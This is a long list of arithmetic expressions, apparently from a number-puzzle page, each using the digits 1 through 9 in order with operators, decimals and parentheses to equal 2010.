2010 = 12-3*(.4-56*.7*(8+9))<br>
2010 = 12*(.3+4*(56-7-.8*9))<br>
2010 = 12*(.3+4*(56-7-8*.9))<br>
2010 = (1+23/4)*.5*67*8/.9<br>
2010 = (1+23/4)*5*67*.8/.9<br>
2010 = (12-3)*4*(.5/6+7*8)-9<br>
2010 = 1*(23+4)*(5+6+7*8)/.9<br>
2010 = (1*23+4)*(5+6+7*8)/.9<br>
2010 = (1*2+34)*(.5/6+7*8)-9<br>
2010 = 1*(2+34)*(.5/6+7*8)-9<br>
2010 = 1+(2/.34+5+6)*7*(8+9)<br>
2010 = (1-(2+3-4*56-7)*8)/.9<br>
2010 = 1+2+(3*4/.5)*(6+78)-9<br>
2010 = 1+(2+34*(5+6*7))/.8+9<br>
2010 = 12-(3+45*(.6-.7*8))*9<br>
2010 = 12-(3+45*(.6-7*.8))*9<br>
2010 = (1+23)/.4-5*6*(7-8*9)<br>
2010 = (12/3.4)*5*6.7*(8+9)<br>
2010 = 1-(2-3/.4+5*6)*(7-89)<br>
2010 = 1-2*3*(4+.5/6)*(7-89)<br>
2010 = .1+2345*.6/.7+.8-.9<br>
2010 = 1*2*3*((4/.5)*6*7+8-9)<br>
2010 = 1+2*((3*4/.5)*6*7-8)+9<br>
2010 = ((1+2*3*4)*5/.6+7+8)*9<br>
2010 = 12*(3*(4+5-.6)*7-8-.9)<br>
2010 = (1+2-(3-4*5/.6)*7+8)*9<br>
2010 = (1-2+3-4*(.5/6-7)*8)*9<br>
2010 = (1+2+3)*(4/.5+6*7*8-9)<br>
2010 = (1-2+3-45*6)*(.7+.8-9)<br>
2010 = (1/.2)*3*4+5*6*(7*8+9)<br>
2010 = 1+2-(3-4*(56+.7)+.8)*9<br>
2010 = (1/2)*3*4*(.5+6*7*8)-9<br>
2010 = (12+3)*.4*(.5+6*7*8)-9<br>
2010 = (.1-.2*34)*5*6*(7-8-9)<br>
2010 = 12+3*(.4+(5+6*.7)*8)*9<br>
2010 = (1-2)*3-4*(.5/6-7*8)*9<br>
2010 = (1+(2+3)*4-.5/6+7)*8*9<br>
2010 = 1+(2+3)*(4/.5+6*7)*8+9<br>
2010 = 1-(23+.4*5*6)*7*(.8-9)<br>
2010 = 1-(23+4*.5*6)*7*(.8-9)<br>
2010 = 1-(23+4*5*.6)*7*(.8-9)<br>
2010 = (1+2)*3*4*(.5/6+7*8)-9<br>
2010 = (1-2/3+4-5*6*(.7-8))*9<br>
2010 = (1*2-3+4*(.5/6+7*8))*9<br>
2010 = 1*(2-3+4*(.5/6+7*8))*9<br>
2010 = 1+2-(.3-4)*(.5+67)*8+9<br>
2010 = .1+(2/3)*45*67+.8-.9<br>
2010 = (1/.2)*3*(4*5+6*7+8*9)<br>
2010 = (1/.2)*3*4-5*6*(7-8*9)<br>
2010 = 1+(2-34-.5*6)*7*(.8-9)<br>
2010 = 1+(2-34-5*.6)*7*(.8-9)<br>
2010 = (12/3.4)*.5*67*(8+9)<br>
2010 = (1-.2+34)*(56.7+.8)+9<br>
2010 = (.1+.2-3-4)*5*6*(7-8-9)<br>
2010 = 1-2/.3-4*(.5/6-7*8*9)<br>
2010 = (1/2-34)*(5-67+8)/.9<br>
2010 = ((123+.4*5)/.6+7+8)*9<br>
2010 = ((123+4*.5)/.6+7+8)*9<br>
2010 = 1-2*(3*4-.5+6)*7*(.8-9)<br>
2010 = 12*(3-(4-.5)*(6*7-89))<br>
2010 = (12-3-4)*(5*(.6+78)+9)<br>
2010 = (1+2/.3-4+.5)*67*.8*9<br>
2010 = ((1-2)/3+4.5)*67*.8*9<br>
2010 = 1-(23.4+.5+.6)*(7-89)<br>
2010 = (.1-2/3+4*56+.7-.8)*9<br>
2010 = 1-(2+3*4.5/.6)*(7-89)<br>
2010 = (1*2/(.3+4.5))*67*8*9<br>
2010 = (12+34+5)*67/(.8+.9)<br>
2010 = (.12/.34)*5*67*(8+9)<br>
2010 = (12/.34)*5*.67*(8+9)<br>
2010 = (1-23-4/.5)*67/(8-9)<br>
2010 = 12+((34*5+.6+7)/.8)*9<br>
2010 = .1+.2-(3-4*(567-8))*.9<br>
2010 = 12-(3-(4+.5)*(6*7+8))*9<br>
2010 = (1-2)*(34-.5)*6*(7-8-9)<br>
2010 = ((1-2)*34+.5)*6*(7-8-9)<br>
2010 = (1+(2+3/4.5)*678)/.9<br>
2010 = 12*((3+.4)*56*7/8+.9)<br>
2010 = 1.2-(3-(4-.5-.6)*78)*9<br>
2010 = 1+(23+(4*5+6)*7)*(.8+9)<br>
2010 = (12+3)*4*((.5-6)*7+8*9)<br>
2010 = 1*23*((.4+5)/.6+78)+9<br>
2010 = (1-(2/3)/4)*.5*67*8*9<br>
2010 = (1-(2/3)/4)*5*67*.8*9<br>
2010 = (.1+2.3/4)*5*67*8/.9<br>
2010 = 1-(2/.3)*(4.5-6*7)*8+9<br>
2010 = 1+(2-3-4)*(56-7)*(.8-9)<br>
2010 = 12*((3+.4/56)*7*8-.9)<br>
2010 = 1+(23-(4-5*6)*7)*(.8+9)<br>
2010 = ((1*2/.3+4*5)*67/8)*9<br>
2010 = 12-(3+(4+.5)*(6-7*8))*9<br>
2010 = (1*(2/.3+4*5)*67/8)*9<br>
2010 = (1/(.2+3-4/5))*67*8*9<br>
2010 = 1-(2+.3*45/.6)*(7-89)<br>
2010 = 1+(2/.3)*(4+5*6.7)*8+9<br>
2010 = 1*((2*3+4*56)*(.7+8)+9)<br>
2010 = (1/.2+.34)*5*67/.89<br>
2010 = 1-(2/.3)*45*(.6-7)+89<br>
2010 = (1+2+3+45)*67/(.8+.9)<br>
2010 = (1*2*3+45)*67/(.8+.9)<br>
2010 = (12+3)*4*5*(6-.7*(8-9))<br>
2010 = 1*(2*3+45)*67/(.8+.9)<br>
2010 = 12/.3+4*(.5-6*(7-89))<br>
2010 = (1-.2+34)*(56+.7+.8)+9<br>
2010 = 12+(.3/.4)*(5*6+7)*8*9<br>
2010 = 12+(3/.4)*(5*6+7)*.8*9<br>
2010 = 12+(3/.4)*(5*6+7)*8*.9<br>
2010 = 12*3*(45+.6*7/.8)/.9<br>
2010 = 12*3*(45+6*.7/.8)/.9<br>
2010 = .1-2+.3-4*(.5+.6-7*8*9)<br>
2010 = (1.2+.3)*4*(.5+6*7*8)-9<br>
2010 = (1-2/3-45)*6*(.7+.8-9)<br>
2010 = (1-.2+34)*(5+6*7/.8)+9<br>
2010 = 1-2*(3+4)*(.5-6*(7+8+9))<br>
2010 = 1-(2+3*4)*(.5-6*(7+8+9))<br>
2010 = 1/2-((3-45)*6+.7)*8-.9<br>
2010 = (1+2+3)*(4+(.5+6*7)*8-9)<br>
2010 = 1*2*((3/.4-.5+6)*78-9)<br>
2010 = 1+(2+(3+4)*5*6-7)*(.8+9)<br>
2010 = 12-3*(.4-56*7*(.8+.9))<br>
2010 = (1/(.2-3+4))*.5*67*8*9<br>
2010 = (1/(.2-3+4))*5*67*.8*9<br>
2010 = (1*(2/3+4)-.5)*67*.8*9<br>
2010 = (1*2/(.3+4+.5))*67*8*9<br>
2010 = ((1/.2)*345+6+78)/.9<br>
2010 = 1+(2+3)*(4-5-6)*7*(.8-9)<br>
2010 = 1-(2/.3)*4*(.5*6-78)+9<br>
2010 = 1-(2/.3)*4*(5*.6-78)+9<br>
2010 = (1*2+3)*(4+5*(.6+7+8*9))<br>
2010 = 1*(2+3)*(4+5*(.6+7+8*9))<br>
2010 = 1+(2+(3+4*5+6)*7)*(.8+9)<br>
2010 = 1+(2+3)*(4+5*6+7)*(.8+9)<br>
2010 = 12-(.3/.4)*(5-6*7)*8*9<br>
2010 = 12-(3/.4)*(5-6*7)*.8*9<br>
2010 = 12-(3/.4)*(5-6*7)*8*.9<br>
2010 = 1+(2/.3)*45*(6+.7)+8-9<br>
2010 = 1+(2/.3)*(4+.5)*67+8-9<br>
2010 = 1+(2+(3-4+5*6)*7)*(.8+9)<br>
2010 = ((1+2)/.3)*(45+67+89)<br>
2010 = 1-(23+.4+.5+.6)*(7-89)<br>
2010 = 1*2*(.3+4+56)*(7+8)/.9<br>
2010 = 1+(2+3)*(4-5+6*7)*(.8+9)<br>
2010 = 1-(2+3*(4+5)+6)*7*(.8-9)<br>
2010 = 1+(2/.34)*(.5+6*7)*8+9<br>
2010 = 1+(2/.3)*(4+.5*67)*8+9<br>
2010 = (1.2/.34)*5*6.7*(8+9)<br>
2010 = (.1*2/.3-4*56)*(7-8)*9<br>
2010 = (1*.2/.3-4*56)*(7-8)*9<br>
2010 = 1*(.2/.3-4*56)*(7-8)*9<br>
2010 = 1.2+3*(4/.5+.6+.7)*8*9<br>
2010 = (123/.4)*5+(6*7/.8)*9<br>
2010 = (1.2/.3)*(4.5-6+7*8*9)<br>
2010 = 1/(.2-.3)-4*(5-6-7*8*9)<br>
2010 = (1-.2-3/.4)*5*6*(7-8-9)<br>
2010 = (1+(2/3+.4*5)*678)/.9<br>
2010 = (1+(2/3+4*.5)*678)/.9<br>
2010 = (1/.2-3+4)*(.5+6*7*8)-9<br>
2010 = (1-2*34)*5*6*(.7-.8-.9)<br>
2010 = (1+(2/3.4)*5)*(6+7*8*9)<br>
2010 = 1+2-(3/(.4-.5)-6)*7*8-9<br>
2010 = ((1+2)/.3)*(45*6-78+9)<br>
2010 = (1*2*3*4*5+.6)*(7+8)/.9<br>
2010 = 1*(2*3*4*5+.6)*(7+8)/.9<br>
2010 = 1+.2-(3-(4-.5-.6)*78)*9<br>
2010 = (1+234/.5)*6*7/(.8+9)<br>
2010 = 1-(2/.3)*(4+.5-6*7)*8+9<br>
2010 = 12*(3.4+(5+6)*(7+8)-.9)<br>
2010 = (.1*2*3+4*5*6)*(7+8)/.9<br>
2010 = (1*.2*3+4*5*6)*(7+8)/.9<br>
2010 = (1*2*.3+4*5*6)*(7+8)/.9<br>
2010 = 1*(.2*3+4*5*6)*(7+8)/.9<br>
2010 = 1*(2*.3+4*5*6)*(7+8)/.9<br>
2010 = (1/.2)*3*(45-(6-7)*89)<br>
2010 = (1-2-3+4*(.5/.6+7*8))*9<br>
2010 = (1-.2/3-.4-5)*(6-7*8)*9<br>
2010 = (12/.34)*.5*6.7*(8+9)<br>
2010 = (12/3.4)*5*67*(.8+.9)<br>
2010 = ((1/.2)*3-45)*67*(8-9)<br>
2010 = (1+(.2+3)*45)*(6+7.8)+9<br>
2010 = 12*34*5+.6/(.7-.8*.9)<br>
2010 = (1+.2)*(34-.5)*(67-8-9)<br>
2010 = (1+2)*(3-4/.5+(67+8)*9)<br>
2010 = (1+2+3)*(.4-.5+6*7*8-.9)<br>
2010 = (1-2-3)*(.4+.5+.6-7*8*9)<br>
2010 = (1+23)*(4-5+6+(7/.8)*9)<br>
2010 = (1+.2+.3)*4*(.5+6*7*8)-9<br>
2010 = ((1+23)/4)*(.5+6*7*8)-9<br>
2010 = ((1-2)/.3)*(4-56-7-8)*9<br>
2010 = 1*2*3*(.4*.5+6*(7-.8)*9)<br>
2010 = (1+((2+3)*45-6+7)*8)/.9<br>
2010 = (1/.2)*((3+4)*56-7+8+9)<br>
2010 = (1/.2)*((3-4+56)*7+8+9)<br>
2010 = ((12/.3)*45-6+7+8)/.9<br>
2010 = (.1*2/.3+4-.5)*67*.8*9<br>
2010 = (1*.2/.3+4-.5)*67*.8*9<br>
2010 = (1/.2)*(3+(4-5+6)*78+9)<br>
2010 = .1*(.2/.3+4-.5)*67*8*9<br>
2010 = 1*(.2/.3+4-.5)*67*.8*9<br>
2010 = (1/(2.3-.4+.5))*67*8*9<br>
2010 = (1+2.3/.4)*5*6.7*8/.9<br>
2010 = ((1-2)/(3-.4-5))*67*8*9<br>
2010 = (1-(2-3*(4+5+67))*8)/.9<br>
2010 = 1*((2+34)*(.5/6+7*8)-9)<br>
2010 = ((1-2)/.3+45)*6.7*.8*9<br>
2010 = (1+2.3*4)*5*67/(.8+.9)<br>
2010 = (1/.2-(3+4)*5)*67*(8-9)<br>
2010 = (1/.2)*(3-4-5)*67*(8-9)<br>
2010 = (1+2)*34*5*6.7/(.8+.9)<br>
2010 = ((1-.2)*34-.5)*67/.89<br>
2010 = (12+3)*4*5*(6-.7/(8-9))<br>
2010 = (1+2+3)*((4/.5)*6*7+8-9)<br>
2010 = 12*(3/.4+(5+6+7)*8/.9)<br>
2010 = 1+.2+3*(4/.5+.6+.7)*8*9<br>
2010 = 12*3*(4+(5*6+7)/.8)/.9<br>
2010 = (12/.3+.4*.5)*(67-8-9)<br>
2010 = 1+(2/.3)*(4+(5*6+7)*8)+9<br>
2010 = ((1.2/.3)*456-7-8)/.9<br>
2010 = (1+(234-5.6/.7)*8)/.9<br>
2010 = 1+((2+3)*4/.5)*(6*7+8)+9<br>
2010 = (1.2/.3)*(4+.5-6+7*8*9)<br>
2010 = (1*2*3/.4)*(5-6+(7+8)*9)<br>
2010 = (1/.2)*((3-4*5)*6+7*8*9)<br>
2010 = 12*(34*5-6/(.7+.8+.9))<br>
2010 = (1/.2)*(3+4+5+6*(7*8+9))<br>
2010 = (1+(.2+3)*45)*(6+7+.8)+9<br>
2010 = 1+(2/.3)*(4*(5+6)*7-8)+9<br>
2010 = 12*3*(4-(5-6*7)/.8)/.9<br>
2010 = 1+(2/.3)*(4-(5-6*7)*8)+9<br>
2010 = (1/.2)*(3+(4+5+6*7)*8-9)<br>
2010 = 1+((2+3)*4*56/.7)/.8+9<br>
2010 = (1+(23*4/.5+6*7)*8)/.9<br>
2010 = ((1+2-.3)/.4)*5*67*8/9<br>
2010 = ((1+2-.3)/4)*5*67*8/.9<br>
2010 = 1+((2*3/.4)/.5)*67+8-9<br>
2010 = ((1+2)*3+4*5*6*(7+8))/.9<br>
2010 = 12-3*(.4-(5+.6)*7*(8+9))<br>
2010 = (1-2)*(3+4*(.5/6-7*8)*9)<br>
2010 = (1+23/4)*5*(6+.7)*8/.9<br>
2010 = (1+(2+.3)/.4)*5*67*8/9<br>
2010 = (1+2.3/.4)*.5*67*8/.9<br>
2010 = (1+2.3/.4)*5*67*.8/.9<br>
2010 = 12*(3+.4+(5+6)*(7+8)-.9)<br>
2010 = (1+2+(.3/4)*5)*67*8/.9<br>
2010 = (1+2+(3/4)*.5)*67*8/.9<br>
2010 = (12/.3-4)*(.5/6+7*8)-9<br>
2010 = (1*(2-3)+4*(.5/6+7*8))*9<br>
2010 = 12+3*(.4/(.5-.6)+78)*9<br>
2010 = 1+(23+4*(.5+6)*7)*(.8+9)<br>
2010 = .1*(2-34*(.5-67)*8)/.9<br>
2010 = ((1+2)*(3+4)-.5/6+7)*8*9<br>
2010 = ((.1-.2)/3+.45)*67*8*9<br>
2010 = ((1*2/.3)*4*5+6*(7+8))*9<br>
2010 = 1*((2/.3)*4*5+6*(7+8))*9<br>
2010 = 1-((2+3)*4/.5)*(6-7*8)+9<br>
2010 = (1/.2)*3*(4+5+6+7*(8+9))<br>
2010 = (1+23*.4)*5*67/(.8+.9)<br>
2010 = 1-(2-3*(.4*5+67))*(.8+9)<br>
2010 = 1-(2-3*(4*.5+67))*(.8+9)<br>
2010 = (1+2)*34*.5*67/(.8+.9)<br>
2010 = (12+3)*4*5*(6-7*(.8-.9))<br>
2010 = (1/.2)*(3+4+5-6*(7-8*9))<br>
2010 = (.1-.2/3-4.5)*(6-7*8)*9<br>
2010 = 1+(2+34)*56+.7/(.8-.9)<br>
2010 = .1+(234+.5)*6/.7+.8-.9<br>
2010 = (.1+(23/.4)*5-.6)*7-8+9<br>
2010 = (1+((2+34.5)*6+7)*8)/.9<br>
2010 = (1/.2-3-4*(.5/6-7)*8)*9<br>
2010 = 12+(3/.4)*(5-.6-.7)*8*9<br>
2010 = 12+(3/.4)*(.5*6+.7)*8*9<br>
2010 = 12+(3/.4)*(5*.6+.7)*8*9<br>
2010 = ((12/.3)*45.6-7-8)/.9<br>
2010 = 12*3*(.4*.5/6+(7-.8)*9)<br>
2010 = (.1-(2-.3)*4)*5*6*(7-8-9)<br>
2010 = (1/.2-3-45*6)*(.7+.8-9)<br>
2010 = (.1-2*(3+.4))*5*6*(7-8-9)<br>
2010 = (1-2*34)*5*6/(.7-.8-.9)<br>
2010 = (1+(2+.3/.45)*678)/.9<br>
2010 = (1+2)/.3+4*5*6*(7+8)/.9<br>
2010 = (1/(2+.3-.4+.5))*67*8*9<br>
2010 = (.1+.23/.4)*5*67*8/.9<br>
2010 = ((1*2/.3)/4)*(56+78)*9<br>
2010 = 1-(.2-3)*(4-.5+6*7*(8+9))<br>
2010 = (1-.2+3*(4+5)*67-.8)/.9<br>
2010 = .1+(2/.3)*4.5*67+.8-.9<br>
2010 = .1+(2/.3)*45*6.7+.8-.9<br>
2010 = (1/.2)*(34-5)*(6+7.8)+9<br>
2010 = ((1+23)*(4+5)*67/.8)/9<br>
2010 = ((1+23)*(4+5)*67/8)/.9<br>
2010 = 1-(2+3)*(4+.5*6)*7*(.8-9)<br>
2010 = 1-(2+3)*(4+5*.6)*7*(.8-9)<br>
2010 = (12/3.4)*5*(6+.7)*(8+9)<br>
2010 = (12/(3+.4))*5*6.7*(8+9)<br>
2010 = ((1/.2)*3-45)*67/(8-9)<br>
2010 = (1-2.3*(4-56))*(7+8)/.9<br>
2010 = (12-3)*4*(56-(.7+.8)/9)<br>
2010 = (1/(.2-3)+4*5*6)*(7.8+9)<br>
2010 = (1*2+34)*(56-(.7+.8)/9)<br>
2010 = 1*(2+34)*(56-(.7+.8)/9)<br>
2010 = (1+(2/.3+4*5)*67.8)/.9<br>
2010 = (.1/.2)*3*4*(.5+6*7*8)-9<br>
2010 = (1/.2)*.3*4*(.5+6*7*8)-9<br>
2010 = (1/.2)*3*.4*(.5+6*7*8)-9<br>
2010 = (1+(23-.4)*(5+67+8))/.9<br>
2010 = (.1-(.2-3-45)*6)*7+.8+.9<br>
2010 = (((1-2)/3)/4+.5)*67*8*9<br>
2010 = 1*(23*((.4+5)/.6+78)+9)<br>
2010 = ((1/.2)/(3+4+5))*67*8*9<br>
2010 = (1-23*(4/5-6))*(7+8)/.9<br>
2010 = (1-.2/.3+4-5*6*(.7-8))*9<br>
2010 = ((1/2-34)/.5)*(6*7-8*9)<br>
2010 = ((1+2)*3-4)*(5*(.6+78)+9)<br>
2010 = (1-(2-3)*4)*(5*(.6+78)+9)<br>
2010 = (1/.2-(3+4)*5)*67/(8-9)<br>
2010 = (1/.2)*(3-4-5)*67/(8-9)<br>
2010 = (1/.2)*(.34+5)*67/.89<br>
2010 = (.1-.2/3-4-.5)*(6-7*8)*9<br>
2010 = (1+(2/3)*(4+5*67)*8)/.9<br>
2010 = (12/(3+.4))*.5*67*(8+9)<br>
2010 = (1.2/.34)*5*67*(.8+.9)<br>
2010 = (12/.34)*5*6.7*(.8+.9)<br>
2010 = 1-(.2+3.4*(5+67))*(.8-9)<br>
2010 = (1/.2)*(34-.5)*(6+7+8-9)<br>
2010 = (.1/2-.3+4)*(5+(67-8)*9)<br>
2010 = (1+2+.3/.4)*(5+(67-8)*9)<br>
2010 = (.1+(2+3)*4)*(5+(6+7)*8-9)<br>
2010 = (1/.2)*(34-5)*(6+7+.8)+9<br>
2010 = (1+2)*3*4*(56-(.7+.8)/9)<br>
2010 = (1+(2/.34)*.5)*(6+7*8*9)<br>
2010 = (1*2/.3)*(4+.5*(67-8))*9<br>
2010 = (1+((2+34+.5)*6+7)*8)/.9<br>
2010 = 1-(((.2-34)*5-6)/.7)*8+9<br>
2010 = 1/(.2-.3)-4*((5-67)*8-9)<br>
2010 = (.1/.2-34)*(5-67+8)/.9<br>
2010 = (1+23-4)*(.5+6*(7+8)/.9)<br>
2010 = 12*(3-4*(5-(6-.7/.8)*9))<br>
2010 = 1+(2+((3+4)*5-6)*7)*(.8+9)<br>
2010 = (1-(2-34*(.5+6)-7)*8)/.9<br>
2010 = 1-((2-(3+4)*5)*6-7)*(.8+9)<br>
2010 = .1+2+(.3-4*(.5*.6-7*8))*9<br>
2010 = 1-(2+3*(4+(5+6)*7))*(.8-9)<br>
2010 = (1/(2-3)+4*(.5/6+7*8))*9<br>
2010 = ((1+2*34*5-6)/(.7+.8))*9<br>
2010 = (.1*2-3.4*(.5-67)*8)/.9<br>
2010 = (1*.2-3.4*(.5-67)*8)/.9<br>
2010 = 1*(.2-3.4*(.5-67)*8)/.9<br>
2010 = ((12+3*4)*5+.6)*(7+8)/.9<br>
2010 = (1+(2*3+4)*5)*67/(.8+.9)<br>
2010 = 1-(2+(.3/.4)*5*6)*(7-89)<br>
2010 = 1-(2+(3/.4)*.5*6)*(7-89)<br>
2010 = 1-(2+(3/.4)*5*.6)*(7-89)<br>
2010 = (1+2+(.3+4)*5*(6+78))/.9<br>
2010 = (1+(.2-3)/.4)*5*67*(8-9)<br>
2010 = (1+2)*(3*4+5)*67/(.8+.9)<br>
2010 = (.1-.2/.3+4*56+.7-.8)*9<br>
2010 = (1-(2-3*4)*5)*67/(.8+.9)<br>
2010 = 1-(2+3*(4+.5)/.6)*(7-89)<br>
2010 = (12/.34)*.5*67*(.8+.9)<br>
2010 = (1/(.2-.3)-4*5)*67*(8-9)<br>
2010 = (1*2/.3)*45*(6-.7*(8-9))<br>
2010 = 1-(2-3*(4+5*(6+7)))*(.8+9)<br>
2010 = (1+23)*(.4+.5+67/.8-.9)<br>
2010 = 1.2+(3*4/.5)*(.6+.7+8)*9<br>
2010 = 12*((.3-.4+5)*(6*7-8)+.9)<br>
2010 = 1+((.2+3)/.4)*5*(6*7+8)+9<br>
2010 = 12*(34-.5)*(6-.7-.8)/.9<br>
2010 = ((1-2)/.3)*(4/5-67.8)*9<br>
2010 = (1/(.2-3)+4*5*6)*(7+.8+9)<br>
2010 = (1*2+(3-4*(.5/.6-7))*8)*9<br>
2010 = 1*(2+(3-4*(.5/.6-7))*8)*9<br>
2010 = ((1+2)/.3-4)*(.5+6*7*8)-9<br>
2010 = (1/(.2/3-.4))*(5-678)-9<br>
2010 = (1+(2+3/(4+.5))*678)/.9<br>
2010 = (1-.2/(3-.4)+5*6)*(7*8+9)<br>
2010 = 12*(.3-4*(5-6*(.7+8-.9)))<br>
2010 = 1-(2+(3/(.4-.5)-6)*7)*8+9<br>
2010 = 12*(.3-4*(5*(.6-7)-.8-9))<br>
2010 = 1*((2/.3)*(4+5*6+.7)-8)*9<br>
2010 = ((1*2/.3)*(4+5*6+.7)-8)*9<br>
2010 = ((1-2)/.3)*(45+(6-78)*9)<br>
2010 = (1*2+3)*4*(.5+6*(7+8)/.9)<br>
2010 = 1-(2/.3)*(4-5*(.6+7)*8)+9<br>
2010 = 1*(2+3)*4*(.5+6*(7+8)/.9)<br>
2010 = 1+2+((3/.4)*(5-.6)*7-8)*9<br>
2010 = ((1+2+3)*4*5+.6)*(7+8)/.9<br>
2010 = (1/.2)*3*4*((.5-6)*7+8*9)<br>
2010 = (.1+(2+.3)/4)*5*67*8/.9<br>
2010 = (1-(.2/3)/.4)*.5*67*8*9<br>
2010 = (1-(.2/3)/.4)*5*67*.8*9<br>
2010 = 12*(.3+4*(5*(6+.7*.8)+9))<br>
2010 = (.1*2-34*(.5-67)*.8)/.9<br>
2010 = (1*.2-34*(.5-67)*.8)/.9<br>
2010 = 1*(.2-34*(.5-67)*.8)/.9<br>
2010 = 1+((2-3-4*5)/.6)*7*(.8-9)<br>
2010 = 1-((.2+.3+4)*56-7)*(.8-9)<br>
2010 = 1-((.2+3)/.4)*5*(6-7*8)+9<br>
2010 = (1/(.2+3-.4/.5))*67*8*9<br>
2010 = ((1+.2/3+4)*(.5+6*7)+8)*9<br>
2010 = 1+(2/.3)*(4+5*(6+.7))*8+9<br>
2010 = (1/.2)*3*4*5*(6-.7*(8-9))<br>
2010 = 1+(2-3*(4+5/.6))*7*(.8-9)<br>
2010 = 1*((23/.4)*5-.6)*7+.8+.9<br>
2010 = (.1-2)/.3+4*(.5/6+7*8*9)<br>
2010 = ((.1+.2)/.3-4)*(5-678)-9<br>
2010 = (1-.2/.3-45)*6*(.7+.8-9)<br>
2010 = ((1*23/.4)*5-.6)*7+.8+.9<br>
2010 = .1/.2-((3-45)*6+.7)*8-.9<br>
2010 = (1+2+3)*(.4*.5+6*(7-.8)*9)<br>
2010 = .1+.2+(.3+4*5)*(6*(7+8)+9)<br>
2010 = ((1-2*34)/.5)*(6*(7-8)-9)<br>
2010 = ((.1/2+3*4+.5)/.6+7)*8*9<br>
2010 = ((1+2)/.3)*((45-6)*7-8*9)<br>
2010 = ((1-(23+4)*5)/.6)*(7-8)*9<br>
2010 = ((1+(23/.4)*5)*6+78)/.9<br>
2010 = (1.2/.3)*((4-5)/6+7*8)*9<br>
2010 = 1/.2+(.3+4*5*6)*(7+8)/.9<br>
2010 = (1*(.2/.3+4)-.5)*67*.8*9<br>
2010 = (1+(.2/.3)*4+.5)*67*.8*9<br>
2010 = (1+(2+3)/.4)*(56+78)/.9<br>
2010 = 1+2*(.3-4*(5*6+.7))*(.8-9)<br>
2010 = ((1+2)/3+4)*(5*(.6+78)+9)<br>
2010 = ((.1-2+3*45)/.6+.7+.8)*9<br>
2010 = (12+3)*((4+5)/.6+7*(8+9))<br>
2010 = (1.2/.34)*5*(6+.7)*(8+9)<br>
2010 = ((1+.2)/.34)*5*6.7*(8+9)<br>
2010 = ((1-2)/.3)*(4+5)*67*(8-9)<br>
2010 = (1-23*(.4-5.6))*(7+8)/.9<br>
2010 = (1/.2)*((34/.5)*6-7-8+9)<br>
2010 = (12/.3)*((4*5+6+7)/.8+9)<br>
2010 = ((1-2)/.3)*(4-(5+6)*7*8+9)<br>
2010 = ((1+2)/.3)*(4*(5-6+7)*8+9)<br>
2010 = 1+.2+(3*4/.5)*(.6+.7+8)*9<br>
2010 = (12/.3)*(.45-6+(7-.8)*9)<br>
2010 = ((1+.2)/.3)*(4.5-6+7*8*9)<br>
2010 = (1*2/.3)*(.4-.5+6*.7*8)*9<br>
2010 = (.1+.2-3)*(4/.5-678)/.9<br>
2010 = ((1+2+3)/.4)*(5-6+(7+8)*9)<br>
2010 = ((.1-.2)/3+4.5)*(6*7+8)*9<br>
2010 = (1-(2+3*(4-56/.7))*8)/.9<br>
2010 = (1+(2/(3+.4))*5)*(6+7*8*9)<br>
2010 = (1*2/.3)*(4+5*(6.7-.8))*9<br>
2010 = (1/.2)*(3+(4*(5+6)+7)*8-9)<br>
2010 = (1/.2)*3*((4+5)*(6+7)+8+9)<br>
2010 = ((1-2)/.3)*(4/.5-67-8)*9<br>
2010 = ((1-2)/.3)*(4/5-67-.8)*9<br>
2010 = (1+2)*(3+(4/.5+67)*8)/.9<br>
2010 = (1+2)*(3+(4/.5)*67/.8)-9<br>
2010 = (1+2+3*4)*((5/.6)*(7+8)+9)<br>
2010 = (((1-2)/.3)/4+5)*67*.8*9<br>
2010 = (((1-2)/3)/.4+5)*67*.8*9<br>
2010 = (1/.2)*(3+(4*5+6)*(7+8)+9)<br>
2010 = (1/.2)*(3*(45/.6+7*8)+9)<br>
2010 = (.1+.2+.3+4*5*6)*(7+8)/.9<br>
2010 = (1/.2)*(3-(4-5*6)*(7+8)+9)<br>
2010 = (1+(.2-3)/.4)*5*67/(8-9)<br>
2010 = 1-(23+(.4+.5)/.6)*(7-89)<br>
2010 = 1-((2+34)*(.5-6)-7)*(.8+9)<br>
2010 = (12/.34)*.5*(6+.7)*(8+9)<br>
2010 = (12/(3+.4))*5*67*(.8+.9)<br>
2010 = ((.1*2/.3-4*56)/(7-8))*9<br>
2010 = ((1*.2/.3-4*56)/(7-8))*9<br>
2010 = (1*(.2/.3-4*56)/(7-8))*9<br>
2010 = (1/(.2-.3)-4*5)*67/(8-9)<br>
2010 = (1*2/.3)*45*(6-.7/(8-9))<br>
2010 = (1+(23-.4)*(.5*6+7)*8)/.9<br>
2010 = (1+(23-.4)*(5*.6+7)*8)/.9<br>
2010 = ((.1-2/.3)*4-5)*(6/7-8)*9<br>
2010 = (1+(2/(.3+.45))*678)/.9<br>
2010 = ((1+2-.3)/.4)*5*6.7*8/.9<br>
2010 = (1+2.3/.4)*5*(6+.7)*8/.9<br>
2010 = (1+(2+.3)/.4)*5*6.7*8/.9<br>
2010 = (1-23*(.4-5-.6))*(7+8)/.9<br>
2010 = 1-((23-.4*5)/.6)*7*(.8-9)<br>
2010 = 1-((23-4*.5)/.6)*7*(.8-9)<br>
2010 = .1*.2-(.3+.4-5*6)*7*(.8+9)<br>
2010 = ((1-2)/.3+45)*(6+.7)*.8*9<br>
2010 = ((.1-.2)/.3+4.5)*67*.8*9<br>
2010 = (1+(2+.3)*4)*5*67/(.8+.9)<br>
2010 = 1+(2+(3+4*(.5+6))*7)*(.8+9)<br>
2010 = (1+2)*34*5*(6+.7)/(.8+.9)<br>
2010 = (1/.2)*3*4*5*(6-.7/(8-9))<br>
2010 = (1*2/.3)*45*(6-7*(.8-.9))<br>
2010 = (1*2/.3)*((4+5)*.6*7*8-.9)<br>
2010 = (1*2/.3)*((4+5)*6*.7*8-.9)<br>
2010 = (1*2/.3)*((4+5)*6*7*.8-.9)<br>
2010 = ((1/.2)*3/4)*(5+(67-8)*9)<br>
2010 = ((1/2)*3/.4)*(5+(67-8)*9)<br>
2010 = (((1+.2)/.3)*456-7-8)/.9<br>
2010 = (1+(234-(5+.6)/.7)*8)/.9<br>
2010 = ((.1-.2)/3+4+.5)*(6*7+8)*9<br>
2010 = ((1+.2)/.3)*(4+.5-6+7*8*9)<br>
2010 = (1-2-3)*((.4+.5)/.6-7*8*9)<br>
2010 = (.1*2+(.3-45)*6)*(.7+.8-9)<br>
2010 = (1*.2+(.3-45)*6)*(.7+.8-9)<br>
2010 = 1*(.2+(.3-45)*6)*(.7+.8-9)<br>
2010 = ((1-.2)*3/.4)*(.5+6*7*8)-9<br>
2010 = (1/(.2+.3)+4)*(.5+6*7*8)-9<br>
